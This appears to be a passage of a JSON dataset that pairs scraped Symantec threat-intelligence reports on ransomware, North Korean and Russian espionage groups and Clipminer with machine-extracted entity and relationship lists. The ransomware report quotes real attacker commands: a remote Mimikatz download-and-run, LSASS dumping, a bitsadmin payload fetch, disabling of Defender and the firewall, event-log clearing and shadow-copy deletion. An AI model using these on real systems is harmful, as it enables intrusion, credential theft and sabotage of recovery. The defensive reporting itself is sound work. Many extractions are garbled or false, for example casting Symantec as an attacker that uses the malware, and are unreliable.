      "raw_output": "Named Entities: (Symantec's Threat Hunter Team, Attacker), (Trojan.Clipminer, Malware), (KryptoCibule, Malware), (Clipminer, Malware), (WinRAR, Tool), (Packed Portable Executable DLL, File), (CPL, File), (Tor network, Network), (Clipboard Hijacking, Technique), (Crypto Mining, Threat Type), (Cryptocurrency, Vulnerability), (Address Format, Vulnerability), (Multiple Replacement Wallet Addresses, Hash)\nRelationships: (Symantec's Threat Hunter Team, uses, Trojan.Clipminer), (Symantec's Threat Hunter Team, uses, KryptoCibule), (Symantec's Threat Hunter Team, uses, Clipminer), (Symantec's Threat Hunter Team, uses, Clipboard Hijacking), (Symantec's Threat Hunter Team, targets, Clipminer), (Clipminer, uses, WinRAR), (Clipminer, uses, Packed Portable Executable DLL), (Clipminer, uses, CPL), (Clipminer, uses, Tor network), (Clipminer, uses, Clipboard Hijacking), (Clipminer, contains, Multiple Replacement Wallet Addresses)",
      "entities": [
        [
          "Symantec's Threat Hunter Team",
          "Attacker"
        ],
        [
          "Trojan.Clipminer",
          "Malware"
        ],
        [
          "KryptoCibule",
          "Malware"
        ],
        [
          "Clipminer",
          "Malware"
        ],
        [
          "WinRAR",
          "Tool"
        ],
        [
          "Packed Portable Executable DLL",
          "File"
        ],
        [
          "CPL",
          "File"
        ],
        [
          "Tor network",
          "Network"
        ],
        [
          "Clipboard Hijacking",
          "Technique"
        ],
        [
          "Crypto Mining",
          "Threat Type"
        ],
        [
          "Cryptocurrency",
          "Vulnerability"
        ],
        [
          "Address Format",
          "Vulnerability"
        ],
        [
          "Multiple Replacement Wallet Addresses",
          "Hash"
        ]
      ],
      "relationships": [
        [
          "Symantec's Threat Hunter Team",
          "uses",
          "Trojan.Clipminer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "uses",
          "KryptoCibule"
        ],
        [
          "Symantec's Threat Hunter Team",
          "uses",
          "Clipminer"
        ],
        [
          "Symantec's Threat Hunter Team",
          "uses",
          "Clipboard Hijacking"
        ],
        [
          "Symantec's Threat Hunter Team",
          "targets",
          "Clipminer"
        ],
        [
          "Clipminer",
          "uses",
          "WinRAR"
        ],
        [
          "Clipminer",
          "uses",
          "Packed Portable Executable DLL"
        ],
        [
          "Clipminer",
          "uses",
          "CPL"
        ],
        [
          "Clipminer",
          "uses",
          "Tor network"
        ],
        [
          "Clipminer",
          "uses",
          "Clipboard Hijacking"
        ],
        [
          "Clipminer",
          "contains",
          "Multiple Replacement Wallet Addresses"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 13,
    "relationship_count": 11
  },
  {
    "title": "ransomware hive conti avoslocker",
    "link": "https://www.security.com/threat-intelligence/ransomware-hive-conti-avoslocker",
    "content": "Targeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness. Symantec, a division ofBroadcom Software, tracks various ransomware threats; however, the following three ransomware families are being observed in the majority of recent attacks: Similar to many other ransomware families, Hive, Conti, and Avoslocker follow the ransomware-as-a-service (RaaS) business model. In the RaaS model the ransomware operators hire affiliates who are responsible for launching the ransomware attacks on their behalf. In most cases affiliates stick to a playbook that contains detailed attack steps laid out by the ransomware operators. Once initial access to a victim network has been gained, Hive, Conti, and Avoslocker use a plethora of TTPs to help the operators achieve the following: Affiliates for the Hive, Conti, and Avoslocker ransomware operators use a variety of techniques to gain an initial foothold on victim networks. Some of these techniques include: In most cases, the spear-phishing emails contain Microsoft Word document attachments embedded with macros that lead to the installation of one of the previously mentioned malware threats. In some instances, attackers use this malware to install Cobalt Strike, which is then used to pivot to other systems on the network. These malware threats are then used to distribute ransomware onto compromised computers. After gaining initial access, Symantec has observed affiliates for all three ransomware families using third-party software such as AnyDesk and ConnectWise Control (previously known as ScreenConnect) to maintain access to victim networks. They also enable default Remote Desktop access in the firewall: netsh advfirewall firewall set rule group=\"Remote Desktop\" new enable=yes Actors are also known to create additional users on compromised systems to maintain access. In some instances we have seen threat actors add registry entries that allow them to automatically log in when a machine is restarted: reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUserName /t REG_SZ /d <user> /f reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v AutoAdminLogon /t REG_SZ /d 1 /f During the discovery phase the ransomware actors try to sweep the victim’s network to identify potential targets. Symantec has observed the aforementioned ransomware actors using tools such as the following: Mimikatz is a go-to tool for most ransomware groups and Hive, Conti, and Avoslocker are no exception. We have observed them using the PowerShell version of Mimikatz as well as the PE version of the tool. There are also instances where the threat actors directly load the PowerShell version of Mimikatz from GitHub repositories: powershell IEX((new-object net.webclient).downloadstring('https://raw.githubusercontent.com/<redacted>/Invoke-Mimikatz.ps1'));Invoke-Mimikatz -DumpCreds In addition to using Mimikatz, the threat actors have also taken advantage of the native rundll32 and comsvcs.dll combination to dump the LSASS memory: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <process id> lsass.dmp full Adversaries also dump the SECURITY, SYSTEM, and SAM hives and later extract credentials from the dump. In rare occasions they have also been observed using taskmgr.exe to dump the LSASS memory and later using the dump to extract valuable credentials. Attackers employ tools like PsExec, WMI, and BITSAdmin to laterally spread and execute the ransomware on victim networks. We have also observed the attackers using several other techniques to laterally move across networks. psexec -accepteula @ips.txt -s -d -c CSIDL_WINDOWS\\xxx.exe wmic /node:@C:\\share$\\comps1.txt /user:\"user\" /password:\"password\" process call create \"cmd.exe /c bitsadmin /transfer xxx \\\\IP\\share$\\xxx.exe %APPDATA%\\xxx.exe&%APPDATA%\\xxx.exe\" bitsadmin /transfer debjob /download /priority normal hxxp://<IP>/ele.dll CSIDL_WINDOWS\\ele.dll mimikatz.exe \"privilege::debug\" \"sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>\" As with a number of other ransomware families, Hive, Conti, and Avoslocker also tamper with various security products that interfere with their goal. We have observed them meddling with security services using the net, taskkill, and sccommands to disable or terminate them. In some cases they also use tools like PC Hunterto end processes. They have also been seen tampering with various registry entries related to security products, since changes to the registry entries can make those products inoperative. Both Hive and AvosLocker have been observed attempting to disable Windows Defender using the following reg.exe commands. reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f reg.exe delete \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiSpyware\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\" /v \"DisableAntiVirus\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" /v \"MpEnablePus\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableBehaviorMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableIOAVProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableOnAccessProtection\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableRealtimeMonitoring\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v \"DisableScanOnRealtimeEnable\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\Reporting\" /v \"DisableEnhancedNotifications\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"DisableBlockAtFirstSeen\" /t REG_DWORD /d \"1\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SpynetReporting\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" /v \"SubmitSamplesConsent\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderApiLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\DefenderAuditLogger\" /v \"Start\" /t REG_DWORD /d \"0\" /f reg.exe delete aHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartupApproved\\Run” /v “Windows Defender” /f reg.exe delete “HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run” /v “Windows Defender” / Disabling the default Windows firewall is also one of the techniques we have seen being used by these ransomware families: netsh advfirewall set allprofiles state off To cover their tracks on a victim system the actors may also clear the Windows event log: wevtutil.exe cl system wevtutil.exe cl security wevtutil.exe cl application powershell -command \"Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }\" Adversaries tend to disable or tamper with operating system settings in order to make it difficult for administrators to recover data. Deleting shadow copies is a common tactic threat actors perform before starting the encryption process. They perform this task by using tools like Vssadmin or WMIC and running one of the following commands: vssadmin.exe delete shadows /all /quiet wmic.exe shadowcopy delete We have also seen BCDEditbeing used to disable automatic system recovery and to ignore failures on boot: bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures bcdedit.exe /set {default} recoveryenabled no In some instances the actors delete the safe mode settings in the registry to stop security product services from starting in safe mode: reg delete HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\<service> /f Attackers commonly exfiltrate critical data from a victim’s environment before encrypting it. They then use the stolen data in an attempt to extort a ransom from victims. We have observed threat actors using the following cloud services to exfiltrate data: We have also seen attackers use the following tools for data exfiltration: The TTPs outlined in this blog are a snapshot of the current ransomware threat landscape. The TTPs used by these threat actors are constantly evolving, with groups continually tweaking their methods in a bid to outmaneuver their targets’ security defenses. As such, organizations need to be vigilant and employ a multi-layered security approach. Symantec Endpoint Protection (SEP) protects against ransomware attacks using multiple static and dynamic technologies. IPSblocksinitial access, persistence, and lateral movement. SEP's Audit Signatures are intended to raise awareness of potentially unwanted traffic on the network. By default, Audit Signatures do not block. Administrators reviewing the logs of IPS events in their network can note these Audit events and decide whether or not to configure the corresponding Audit Signatures to block the traffic. The following is a list of Audit Signatures that can be enabled to block, through policies, activity related to the use of software or tools such as AnyDesk, ScreenConnect, and PsExec. Symantec recommends that you have intrusion prevention enabled on all your devices including servers. Symantec Adaptive Protectioncan help protect against lateral movement and ransomware execution techniques used by an attacker. If you are not using tools like PsExec, WMIC, and BITSAdmin in your environment then you should “Deny” these applications and actions using Symantec Adaptive Protection policies. Karthikeyan is a member of Symantec’s Security Technology and Response team which is focused on providing round-the-clock protection against current and future cyber threats. Vishal is member of Symantec’s Security Technology and Response team where he is focused on researching future cyber threats. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (Hive, Malware), (Conti, Malware), (Avoslocker, Malware), (Symantec, Company), (Broadcom Software, Company), (ransomware-as-a-service, Business Model), (affiliates, Attacker), (playbook, Technique), (initialAccess, Technique), (macro, Tool), (Word document attachment, File), (macros, Tool), (Victim network, Tool), (spear-phishing email, Technique), (Microsoft Word, Tool), (initial foothold, Technique)\nRelationships: (ransomware, uses, Hive), (ransomware, uses, Conti), (ransomware, uses, Avoslocker), (ransomware, follows, ransomware-as-a-service), (ransomware, uses, macro), (ransomware, uses, Word document attachment), (ransomware, uses, macros), (ransomware, uses, Victim network), (ransomware, uses, spear-phishing email), (ransomware, uses, Microsoft Word), (ransomware, uses, playbook), (ransomware, uses, technique), (ransomware, uses, technique), (ransomware, uses, technique), (ransomware, uses, technique), (ransomware, uses, technique), (ransomware, uses, technique), (ransomware, uses",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "Hive",
          "Malware"
        ],
        [
          "Conti",
          "Malware"
        ],
        [
          "Avoslocker",
          "Malware"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "Broadcom Software",
          "Company"
        ],
        [
          "ransomware-as-a-service",
          "Business Model"
        ],
        [
          "affiliates",
          "Attacker"
        ],
        [
          "playbook",
          "Technique"
        ],
        [
          "initialAccess",
          "Technique"
        ],
        [
          "macro",
          "Tool"
        ],
        [
          "Word document attachment",
          "File"
        ],
        [
          "macros",
          "Tool"
        ],
        [
          "Victim network",
          "Tool"
        ],
        [
          "spear-phishing email",
          "Technique"
        ],
        [
          "Microsoft Word",
          "Tool"
        ],
        [
          "initial foothold",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "uses",
          "Hive"
        ],
        [
          "ransomware",
          "uses",
          "Conti"
        ],
        [
          "ransomware",
          "uses",
          "Avoslocker"
        ],
        [
          "ransomware",
          "follows",
          "ransomware-as-a-service"
        ],
        [
          "ransomware",
          "uses",
          "macro"
        ],
        [
          "ransomware",
          "uses",
          "Word document attachment"
        ],
        [
          "ransomware",
          "uses",
          "macros"
        ],
        [
          "ransomware",
          "uses",
          "Victim network"
        ],
        [
          "ransomware",
          "uses",
          "spear-phishing email"
        ],
        [
          "ransomware",
          "uses",
          "Microsoft Word"
        ],
        [
          "ransomware",
          "uses",
          "playbook"
        ],
        [
          "ransomware",
          "uses",
          "technique"
        ],
        [
          "ransomware",
          "uses",
          "technique"
        ],
        [
          "ransomware",
          "uses",
          "technique"
        ],
        [
          "ransomware",
          "uses",
          "technique"
        ],
        [
          "ransomware",
          "uses",
          "technique"
        ],
        [
          "ransomware",
          "uses",
          "technique"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 17,
    "relationship_count": 17
  },
  {
    "title": "stonefly north korea espionage",
    "link": "https://www.security.com/threat-intelligence/stonefly-north-korea-espionage",
    "content": "The North Korean-linked Stonefly group is continuing to mount espionage attacks against highly specialized engineering companies with a likely goal of obtaining sensitive intellectual property. Stonefly specializes in mounting highly selective targeted attacks against targets that could yield intelligence to assist strategically important sectors such as energy, aerospace, and military equipment. Virtually all of the technologies it appears to be interested in have military as well as civilian uses and some could have applications in the development of advanced weaponry. Stonefly (aka DarkSeoul, BlackMine, Operation Troy, and Silent Chollima) first came to notice in July 2009, when it mounted distributed denial-of-service (DDoS) attacks against a number of South Korean, U.S. government, and financial websites. It reappeared again in 2011, when it launched more DDoS attacks, but also revealed an espionage element to its attacks when it was found to be using a sophisticated backdoor Trojan (Backdoor.Prioxer) against selected targets. In March 2013, the group was linked to the Jokra (Tojan.Jokra) disk-wiping attacks against a number of South Korean banks and broadcasters. Three months later, the group was involved in a string ofDDoS attacks against South Korean government websites. In recent years, the group’s capabilities have grown markedly and, since at least 2019 Symantec has seen its focus shift solely to espionage operations against select, high-value targets. It now appears to specialize in targeting organizations that hold classified or highly sensitive information or intellectual property. Stonefly’s operations appear to be part of a broader North Korean-sponsored campaign to acquire information and intellectual property, with Operation Dream Job, a more wider-ranging trawl across multiple sectors, being carried out by another North Korean group, Pompilus. The most recent attack discovered by Symantec, a division ofBroadcom Software, was against an engineering firm that works in the energy and military sectors. The attackers breached the organization in February 2022, most likely by exploiting theLog4j vulnerability(CVE-2021-44228) vulnerability on a public-facing VMware View server. The attackers then moved across the network and compromised 18 other computers. 17 hours later:Shortly after compromising the initial server, the attackers installed an updated version of Stonefly’s Backdoor.Preft malware (aka Dtrack, Valefor). The attackers then used a masqueraded version (file name: pvhost.exe) ofPuTTY’s PSCP command line application, presumably to exfiltrate data from the infected machine. Shortly after PSCP was executed, the credential-dumping tool Mimikatz (masquerading under the file name pl.exe) was run. Day 2: Malicious activity resumed when3proxy tiny proxy server, a publicly available proxy tool (file name: svhost.exe) was executed. Use of this tool continued for the next four days. A second suspected proxy tool was installed two days into this four day period (file name: tapi.exe). Several hours afterwards, a copy of the Preft backdoor (file name: svchost.exe) was installed. Two days later,WinSCP, an open-source SSH file-transfer tool was used, presumably to exfiltrate or upload data to the compromised computer. Day 3:The next phase of the intrusion began on the following day, when Preft was executed and the attackers began moving latterly across the organization’s network, usingInvoke-TheHash, a publicly available PowerShell pass-the-hash utility (file name: rev.ps1), and wmiexec.py,a publicly available Impacket toolused to run WMI commands (file name: notepad.exe). The attackers used an updated version of Stonefly’s custom Preft backdoor. Analysis of the backdoor revealed that it is a multistage tool: Stage 1 is the main binary. A python script is used to unpack the binary and shellcode. Stage 2 is shellcode. It performs the following actions: Stage 3 is more shellcode. Stage 4 is the payload. It is an HTTP remote access tool (RAT) that supports various commands, including: The malware can support four different kinds of plugins: executable files, VBS, BAT, and shellcode. It supports three different persistence modes: Startup_LNK, Service, Registry, and Task Scheduler. Along with the Preft backdoor, Stonefly also deployed what appears to be a custom developed information stealer (infostealer). Analysis of this malware revealed that it is a three-staged threat. The main binary extracts and decrypts the encrypted shellcode with a modified RC4 algorithm. Stage 2 is shellcode which retrieves the payload and decrypts it with the same modified RC4 algorithm. The decrypted payload is an executable file that is loaded in-memory. It is designed to search the infected computer for files using pre-configured parameters. These are then copied to temporary files before being copied to a single .zip file and the temporary files are removed. The ZIP file path is %TEMP/~[XXXXXXXX].tmp, where XXXXXXXX is a simple hash of the computer name (eight uppercase hex digits). Curiously, this ZIP file is not automatically exfiltrated. It is possible that the exfiltration functionality was removed and the attackers planned to use an alternative means of exfiltration. While Stonefly’s tools and tactics continue to evolve, there are some common threads between this recent activity and previous attacks, such as its ongoing development of the Preft backdoor and heavy reliance on open-source tools. The group’s capabilities and its narrow focus on acquiring sensitive information make it one of the most potent North Korean cyber threat actors operating today. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file is available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Stonefly, Attacker), (Backdoor.Prioxer, Malware), (Jokra, Threat Type), (DDoS, Technique), (South Korean, Country), (U.S. government, Organization), (financial website, Website), (bank, Organization), (disk-wiping, Technique), (Symantec, Company), (March 2013, Date), (March 2014, Date)\nRelationships: (Stonefly, uses, Backdoor.Prioxer), (Stonefly, reappeared, 2011), (Stonefly, appeared, 2009), (Stonefly, linkedTo, Jokra), (Stonefly, focusedOn, espionageOperations), (Stonefly, shiftedFocus, 2019)",
      "entities": [
        [
          "Stonefly",
          "Attacker"
        ],
        [
          "Backdoor.Prioxer",
          "Malware"
        ],
        [
          "Jokra",
          "Threat Type"
        ],
        [
          "DDoS",
          "Technique"
        ],
        [
          "South Korean",
          "Country"
        ],
        [
          "U.S. government",
          "Organization"
        ],
        [
          "financial website",
          "Website"
        ],
        [
          "bank",
          "Organization"
        ],
        [
          "disk-wiping",
          "Technique"
        ],
        [
          "Symantec",
          "Company"
        ],
        [
          "March 2013",
          "Date"
        ],
        [
          "March 2014",
          "Date"
        ]
      ],
      "relationships": [
        [
          "Stonefly",
          "uses",
          "Backdoor.Prioxer"
        ],
        [
          "Stonefly",
          "reappeared",
          "2011"
        ],
        [
          "Stonefly",
          "appeared",
          "2009"
        ],
        [
          "Stonefly",
          "linkedTo",
          "Jokra"
        ],
        [
          "Stonefly",
          "focusedOn",
          "espionageOperations"
        ],
        [
          "Stonefly",
          "shiftedFocus",
          "2019"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 6
  },
  {
    "title": "shuckworm intense campaign ukraine",
    "link": "https://www.security.com/threat-intelligence/shuckworm-intense-campaign-ukraine",
    "content": "The Russian-linked Shuckworm espionage group (aka Gamaredon, Armageddon) is continuing to mount an intense cyber campaign against organizations in Ukraine. Shuckworm has almost exclusively focused its operations on Ukraine since it first appeared in 2014. These attacks have continued unabated since the Russian invasion of the country. While the group’s tools and tactics are simple and sometimes crude, the frequency and persistence of its attacks mean that it remains one of the key cyber threats facing organizations in the region. One of the hallmarks of the group’s recent activity is the deployment of multiple malware payloads on targeted computers. These payloads are usually different variants of the same malware (Backdoor.Pterodo), designed to perform similar tasks. Each will communicate with a different command-and-control (C&C) server. The most likely reason for using multiple variants is that it may provide a rudimentary way of maintaining persistence on an infected computer. If one payload or C&C server is detected and blocked, the attackers can fall back on one of the others and roll out more new variants to compensate. Symantec’s Threat Hunter Team, part ofBroadcom Software, has found four distinct variants of Pterodo being used in recent attacks. All of them are Visual Basic Script (VBS) droppers with similar functionality. They will drop a VBScript file, use Scheduled Tasks (shtasks.exe) to maintain persistence, and download additional code from a C&C server. All of the embedded VBScripts were very similar to one another and used similar obfuscation techniques. This variant is a modified self-extracting archive, containing obfuscated VBScripts in resources that can be unpacked by 7-Zip. It then adds them as a scheduled task to ensure persistence: The script also copies itself to [USERPROFILE]\\ntusers.ini file. The two newly created files are more obfuscated VBScripts. This variant is also designed to drop VBScripts on the infected computer. When run, it will first engage in API hammering, making multiple meaningless API calls, which is presumably an attempt to avoid sandbox detection. It will then unpack a script and a file called offspring.gif to C:\\Users\\[username]\\. It will call the script with: This script runs ipconfig /flushdns and executes the offspring.gif file. Offsprint.gif will download a PowerShell script from a random subdomain of corolain.ru and execute it: This variant is another VBScript dropper. It will create two files: It executes them with the following command: Similar to the other variants, the first script will run ipconfig /flushdns before calling the second script and removing the original executable. The second script has two layers of obfuscation, but in the end it downloads the final payload from the domain declined.delivered.maizuko[.]ru and executes it. The final variant is functionally very similar to variants B and C, engaging in API hammering before extracting two VBScript files to the user’s home directory. Script obfuscation is very similar to other variants. While the attackers have made heavy use of Pterodo during recent weeks, other tools have also been deployed alongside it. These include UltraVNC, an open-source remote-administration/remote-desktop-software utility. UltraVNC has previously been used by Shuckworm in multiple attacks. In addition to this, Shuckworm has also been observed using Process Explorer, a Microsoft Sysinternals tool designed to provide information about which handles and DLL processes have opened or loaded. While Shuckworm is not the most tactically sophisticated espionage group, it compensates for this in its focus and persistence in relentlessly targeting Ukrainian organizations. It appears that Pterodo is being continuously redeveloped by the attackers in a bid to stay ahead of detection. While Shuckworm appears to be largely focused on intelligence gathering, its attacks could also potentially be a precursor to more serious intrusions, if the access it acquires to Ukrainian organizations is turned over to other Russian-sponsored actors. For the latest protection updates, please visit theSymantec Protection Bulletin. A full list of IOCs isavailable here on GitHub. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Shuckworm, Attacker), (Backdoor.Pterodo, Malware), (Visual Basic Script, Tool), (Scheduled Tasks, Tool), (C&C server, Domain), (Symantec's Threat Hunter Team, Tool), (Broadcom Software, Tool)\\nRelationships: (Shuckworm, uses, Backdoor.Pterodo), (Shuckworm, uses, Visual Basic Script), (Shuckworm, uses, Scheduled Tasks), (Shuckworm, uses, C&C server), (Shuckworm, uses, Symantec's Threat Hunter Team), (Shuckworm, uses, Broadcom Software), (Shuckworm, linkedTo, Backdoor.Pterodo), (Shuckworm, linkedTo, Visual Basic Script), (Shuckworm, linkedTo, Scheduled Tasks), (Shuckworm, linkedTo, C&C server), (Shuckworm, linkedTo, Symantec's Threat Hunter Team), (Shuckworm, linkedTo, Broadcom Software)",
      "entities": [
        [
          "Shuckworm",
          "Attacker"
        ],
        [
          "Backdoor.Pterodo",
          "Malware"
        ],
        [
          "Visual Basic Script",
          "Tool"
        ],
        [
          "Scheduled Tasks",
          "Tool"
        ],
        [
          "C&C server",
          "Domain"
        ],
        [
          "Symantec's Threat Hunter Team",
          "Tool"
        ],
        [
          "Broadcom Software",
          "Tool"
        ],
        [
          "Shuckworm",
          "uses",
          "Backdoor.Pterodo"
        ],
        [
          "Shuckworm",
          "uses",
          "Visual Basic Script"
        ],
        [
          "Shuckworm",
          "uses",
          "Scheduled Tasks"
        ],
        [
          "Shuckworm",
          "uses",
          "C&C server"
        ],
        [
          "Shuckworm",
          "uses",
          "Symantec's Threat Hunter Team"
        ],
        [
          "Shuckworm",
          "uses",
          "Broadcom Software"
        ],
        [
          "Shuckworm",
          "linkedTo",
          "Backdoor.Pterodo"
        ],
        [
          "Shuckworm",
          "linkedTo",
          "Visual Basic Script"
        ],
        [
          "Shuckworm",
          "linkedTo",
          "Scheduled Tasks"
        ],
        [
          "Shuckworm",
          "linkedTo",
          "C&C server"
        ],
        [
          "Shuckworm",
          "linkedTo",
          "Symantec's Threat Hunter Team"
        ],
        [
          "Shuckworm",
          "linkedTo",
          "Broadcom Software"
        ]
      ],
      "relationships": [],
      "has_entities": true
    },
    "entity_count": 19,
    "relationship_count": 0
  },
  {
    "title": "lazarus dream job chemical",
    "link": "https://www.security.com/threat-intelligence/lazarus-dream-job-chemical",
    "content": "Symantec, a division ofBroadcom Software, has observed the North Korea-linked advanced persistent threat (APT) group known as Lazarus conducting an espionage campaign targeting organizations operating within the chemical sector. The campaign appears to be a continuation of Lazarus activity dubbed Operation Dream Job, which was first observed in August 2020. Symantec tracks this sub-set of Lazarus activity under the name Pompilus. Operation Dream Job involves Lazarus using fake job offers as a means of luring victims into clicking on malicious links or opening malicious attachments that eventually lead to the installation of malware used for espionage. Past Dream Job campaigns have targeted individuals in the defense, government, and engineering sectors in activity observed inAugust 2020andJuly 2021. In January 2022, Symantec detected attack activity on the networks of a number of organizations based in South Korea. The organizations were mainly in the chemical sector, with some being in the information technology (IT) sector. However, it is likely the IT targets were used as a means to gain access to chemical sector organizations. There is sufficient evidence to suggest that this recent activity is a continuation of Operation Dream Job. That evidence includes file hashes, file names, and tools that were observed in previous Dream Job campaigns. A typical attack begins when a malicious HTM file is received, likely as a malicious link in an email or downloaded from the web. The HTM file is copied to a DLL file called scskapplink.dll and injected into the legitimate system management software INISAFE Web EX Client. The scskapplink.dll file is typically a signed Trojanized tool with malicious exports added. The attackers have been observed using the following signatures: DOCTER USA, INC and \"A\" MEDICAL OFFICE, PLLC Next, scskapplink.dll downloads and executes an additional payload from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". This step kicks off a chain of shellcode loaders that download and execute arbitrary commands from the attackers, as well as additional malware, which are usually executed from malicious exports added to Trojanized tools such as the Tukaani project LZMA Utils library (XZ Utils). The attackers move laterally on the network using Windows Management Instrumentation (WMI) and inject into MagicLine by DreamSecurity on other machines. In some instances, the attackers were spotted dumping credentials from the registry, installing a BAT file in a likely effort to gain persistence, and using a scheduled task configured to run as a specific user. The attackers were also observed deploying post-compromise tools, including a tool used to take screenshots of web pages viewed on the compromised machine at set intervals (SiteShoter). They were also seen using an IP logging tool (IP Logger), a protocol used to turn computers on remotely (WakeOnLAN), a file and directory copier (FastCopy), and the File Transfer Protocol (FTP) executed under the MagicLine process. The following is a case study detailing step-by-step attacker activity on an organization in the chemical sector. 00:51 –A malicious HTM file is received: The HTM file is copied to a DLL file: This DLL file is injected into the legitimate system management software INISAFE Web EX Client. The file is a signed Trojanized version of the ComparePlus plugin for Notepad++ with malicious exports added. 01:02 –The file is run and downloads and executes a backdoor payload (final.cpl - 5f20cc6a6a82b940670a0f89eda5d68f091073091394c362bfcaf52145b058db) from a command-and-control (C&C) server with the URL parameter key/values \"prd_fld=racket\". The file final.cpl is a Trojanized version of the Tukaani project LZMA Utils library (XZ Utils) with a malicious export added (AppMgmt). The malware connects to, downloads, decodes, and executes shellcode from the following remote location: 01:04 –Another CPL file (61e305d6325b1ffb6de329f1eb5b3a6bcafa26c856861a8200d717df0dec48c4) is executed. This file, again, is a Trojanized version of LZMA Utils with a malicious added export. 01:13 –The shellcode loader (final.cpl) is executed again several times. 01:38 –Commands are executed to dump credentials from the SAM and SYSTEM registry hives. Over the next several hours, the attackers run unknown shellcode via final.cpl at various intervals, likely to collect the dumped system hives, among other things. 06:41 –The attackers create a scheduled task to ensure persistence between system reboots: The scheduled task instructs the system to execute 'Intel.bat' as user ‘[REDACTED].help/175287’ starting at 15:42 then every minute under the scheduled task name ‘arm’. It's unclear if this was an account that was cracked via the dumped registry hives or an account the attackers were able to create with admin rights. The attackers were also observed installing Cryptodome (PyCrypto fork) Python encryption modules via CPL files. A clean installation of BitDefender was also installed by the attackers. While unconfirmed, the threat actors may have installed an older version of this software (from 2020) with avulnerability that allowed attackers to run arbitrary commands remotely. 00:21 –The final.cpl file is executed again. 00:49 –A new CPL file called wpm.cpl (942489ce7dce87f7888322a0e56b5e3c3b0130e11f57b3879fbefc48351a78f6) is executed. This file contains, and connects to, a list of IP addresses and records whether the connections were successful. 01:11 –Again, the final.cpl shellcode loader is executed multiple times, executing some unknown shellcode. This activity continued intermittently until 23:49. 23:49 –The file name of the CPL file changes to 'ntuser.dat'. The file location and command-line arguments remain the same. 00:24 –The CPL shellcode loader files (final.cpl and ntuser.dat) are executed multiple times. 00:28 –The attackers create a scheduled task on another machine, likely to ensure persistence: The command is used to schedule a task named 'arm' to run the file 'arm.bat' starting at at 09:28 then every minute after that under the user account '[REDACTED]\\i21076'. 00:29 –A file named arm.dat (48f3ead8477f3ef16da6b74dadc89661a231c82b96f3574c6b7ceb9c03468291) is executed with the following command line arguments: The arm.dat file is a tool used to take screenshots of web pages viewed on the compromised machine every 10 seconds (SiteShoter), as determined by the command line arguments. The screenshots are saved in appdata\\local with the date at the top of the file. 06:50 –The shellcode loader (final.cpl) is executed several times. 07:34 –A new CPL file named addins.cpl 